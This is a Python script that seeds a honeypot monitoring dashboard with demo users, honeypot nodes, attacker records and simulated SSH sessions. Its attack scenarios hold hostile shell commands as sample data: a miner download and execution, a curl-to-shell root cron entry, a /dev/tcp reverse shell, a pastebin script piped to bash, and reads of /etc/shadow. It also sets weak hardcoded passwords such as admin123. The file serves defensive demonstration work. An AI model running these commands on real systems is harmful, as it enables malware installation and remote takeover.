import sys
from pathlib import Path

# Ensure project root is in sys.path
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

import datetime
import random
from config.database import SessionLocal, init_db
from backend.models import User, Attacker, Honeypot, AttackEvent, Session, Command, Alert
from config.security_config import SecurityConfig

def seed_database():
    """Seeds the database with users, realistic honeypots, attackers, sessions, and alerts."""
    init_db()
    db = SessionLocal()

    try:
        # Check if users already exist
        if db.query(User).first():
            print("[INFO] Database already contains data. Skipping re-seed.")
            return

        print("[*] Seeding Initial Users...")
        admin = User(username="admin", role="admin")
        admin.set_password("admin123")
        analyst = User(username="analyst", role="analyst")
        analyst.set_password("analyst123")
        viewer = User(username="viewer", role="viewer")
        viewer.set_password("viewer123")
        db.add_all([admin, analyst, viewer])

        print("[*] Seeding Honeypot Nodes...")
        h1 = Honeypot(name="SSH-HONEYPOT-PROD-01", type="cowrie-ssh", ip_address="198.51.100.5", port=2222, status="active")
        h2 = Honeypot(name="SSH-HONEYPOT-CLOUD-EU", type="cowrie-ssh", ip_address="51.15.22.94", port=22, status="active")
        h3 = Honeypot(name="TELNET-IOT-BAIT", type="cowrie-telnet", ip_address="198.51.100.6", port=23, status="active")
        db.add_all([h1, h2, h3])
        db.commit()

        print("[*] Seeding Threat Actors & Attackers...")
        attackers_meta = [
            ("185.220.101.5", "Germany", "DE", "Frankfurt", 50.1109, 8.6821, "AS205100", "Tor Exit Relay Network", 95, 340),
            ("194.26.29.112", "Russia", "RU", "Moscow", 55.7558, 37.6173, "AS49505", "Hostkey B.V. Bulletproof", 92, 280),
            ("45.155.205.233", "Netherlands", "NL", "Amsterdam", 52.3676, 4.9041, "AS51852", "Private Layer Inc.", 78, 145),
            ("114.119.130.88", "China", "CN", "Beijing", 39.9042, 116.4074, "AS4134", "Chinanet Backbone", 85, 210),
            ("198.51.100.42", "United States", "US", "Ashburn", 39.0438, -77.4874, "AS14618", "Amazon AWS Cloud", 60, 92),
            ("103.251.167.20", "India", "IN", "Mumbai", 19.0760, 72.8777, "AS133694", "Bharti Airtel Ltd", 45, 65),
            ("178.128.240.11", "Singapore", "SG", "Singapore", 1.3521, 103.8198, "AS14061", "DigitalOcean ASN", 72, 120),
            ("91.240.118.172", "Ukraine", "UA", "Kyiv", 50.4501, 30.5234, "AS200052", "Delta-X ISP", 68, 88),
        ]

        attacker_objs = []
        now = datetime.datetime.utcnow()

        for ip, country, code, city, lat, lon, asn, isp, rep, attacks in attackers_meta:
            atk = Attacker(
                source_ip=ip, country=country, country_code=code, city=city,
                latitude=lat, longitude=lon, asn=asn, isp=isp, reputation=rep,
                total_attacks=attacks,
                first_seen=now - datetime.timedelta(days=random.randint(5, 30)),
                last_seen=now - datetime.timedelta(minutes=random.randint(1, 120))
            )
            db.add(atk)
            attacker_objs.append(atk)
        db.commit()

        print("[*] Seeding Sessions, Real Attack Scenarios & Captured Commands...")
        command_scenarios = [
            # Scenario 1: Botnet / Cryptominer Dropper
            [
                ("uname -a", "OS Discovery", 10),
                ("cat /proc/cpuinfo | grep 'model name' | wc -l", "System Reconnaissance", 15),
                ("cd /tmp || cd /var/run || cd /dev/shm", "Directory Exploration", 10),
                ("wget http://185.220.101.5/bins/x86_64 -O .miner; chmod 777 .miner", "Suspicious File Retrieval", 25),
                ("./.miner -o stratum+tcp://xmr.pool:3333 -u 48... -p x &", "Malicious Execution", 25),
                ("rm -rf .miner", "Defense Evasion", 15)
            ],
            # Scenario 2: Lateral Reconnaissance & Privilege Hunting
            [
                ("whoami", "System Reconnaissance", 10),
                ("id", "System Reconnaissance", 10),
                ("cat /etc/passwd", "Credential Discovery", 20),
                ("cat /etc/shadow", "Privilege Escalation Attempt", 25),
                ("sudo -l", "Privilege Escalation Attempt", 20),
                ("netstat -tulnp", "Network Discovery", 15),
                ("crontab -l", "Persistence Check", 15),
                ("echo '* * * * * curl http://194.26.29.112/beacon.sh | sh' >> /var/spool/cron/crontabs/root", "Persistence Attempt", 25)
            ],
            # Scenario 3: Quick Scan & Disconnect
            [
                ("echo 1", "General", 5),
                ("ls -la", "Directory Exploration", 10),
                ("ps aux", "System Reconnaissance", 10),
                ("exit", "General", 0)
            ],
            # Scenario 4: Web Shell / Reverse Shell Attempt
            [
                ("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "Defense Evasion", 20),
                ("bash -i >& /dev/tcp/45.155.205.233/4444 0>&1", "Reverse Shell Attempt", 25),
                ("curl -s http://pastebin.com/raw/malware.sh | bash", "Suspicious File Retrieval", 25)
            ]
        ]

        target_usernames = ["root", "admin", "ubuntu", "user", "test", "postgres", "guest", "deploy"]
        passwords = ["123456", "password", "toor", "admin123", "root", "ubuntu2026", "qwerty"]

        # Generate realistic attack sessions
        session_count = 12
        for i in range(session_count):
            attacker = random.choice(attacker_objs)
            honeypot = random.choice([h1, h2, h3])
            start_offset = random.randint(10, 1440)
            start_time = now - datetime.timedelta(minutes=start_offset)
            duration = random.randint(25, 450)
            end_time = start_time + datetime.timedelta(seconds=duration)
            s_uuid = f"sess_{random.randint(10000000, 99999999):x}"

            # Create session
            scenario = random.choice(command_scenarios)
            total_risk = min(100, sum([cmd[2] for cmd in scenario]) + random.randint(10, 20))

            sess = Session(
                session_id=s_uuid,
                attacker_id=attacker.id,
                honeypot_id=honeypot.id,
                start_time=start_time,
                end_time=end_time,
                duration_seconds=duration,
                command_count=len(scenario),
                risk_score=total_risk,
                status="closed" if i > 1 else "active"
            )
            db.add(sess)
            db.flush()

            # Add Login Attack Events leading up to session
            for _ in range(random.randint(2, 6)):
                u_name = random.choice(target_usernames)
                p_raw = random.choice(passwords)
                evt_time = start_time - datetime.timedelta(seconds=random.randint(5, 60))
                evt_fail = AttackEvent(
                    attacker_id=attacker.id,
                    honeypot_id=honeypot.id,
                    session_id=s_uuid,
                    event_type="cowrie.login.failed",
                    username=u_name,
                    password_masked=SecurityConfig.mask_credential(p_raw),
                    raw_payload=f'{{"eventid": "cowrie.login.failed", "username": "{u_name}"}}',
                    timestamp=evt_time
                )
                db.add(evt_fail)

            # Successful login event
            evt_success = AttackEvent(
                attacker_id=attacker.id,
                honeypot_id=honeypot.id,
                session_id=s_uuid,
                event_type="cowrie.login.success",
                username="root",
                password_masked=SecurityConfig.mask_credential("root123"),
                raw_payload='{"eventid": "cowrie.login.success", "username": "root"}',
                timestamp=start_time
            )
            db.add(evt_success)

            # Add Commands
            cmd_time = start_time
            for cmd_str, cat, points in scenario:
                cmd_time += datetime.timedelta(seconds=random.randint(2, 15))
                cmd = Command(
                    session_id=sess.id,
                    command=cmd_str,
                    category=cat,
                    risk_points=points,
                    timestamp=cmd_time
                )
                db.add(cmd)

                # Add command attack event
                evt_cmd = AttackEvent(
                    attacker_id=attacker.id,
                    honeypot_id=honeypot.id,
                    session_id=s_uuid,
                    event_type="cowrie.command.input",
                    username="root",
                    raw_payload=f'{{"eventid": "cowrie.command.input", "input": "{cmd_str}"}}',
                    timestamp=cmd_time
                )
                db.add(evt_cmd)

            # Create Alerts for high-risk sessions
            if total_risk >= 60:
                severity = "Critical" if total_risk >= 80 else "High"
                title = f"{severity} Risk Intrusion: Command Injection & Payload Delivery" if "wget" in str(scenario) else f"{severity} Threat: Reconnaissance & Persistence Attempt"
                alert = Alert(
                    event_id=evt_success.id,
                    attacker_id=attacker.id,
                    severity=severity,
                    risk_score=total_risk,
                    title=title,
                    description=f"Attacker executed {len(scenario)} commands from {attacker.source_ip} ({attacker.country}) including suspicious activities: {scenario[0][0]}.",
                    status=random.choice(["open", "open", "investigating"]),
                    timestamp=cmd_time
                )
                db.add(alert)

        db.commit()
        print("[+] Database initialized & seeded successfully with high-fidelity SOC data!")

    except Exception as e:
        db.rollback()
        print(f"[!] Error seeding database: {e}")
        raise
    finally:
        db.close()

if __name__ == "__main__":
    seed_database()
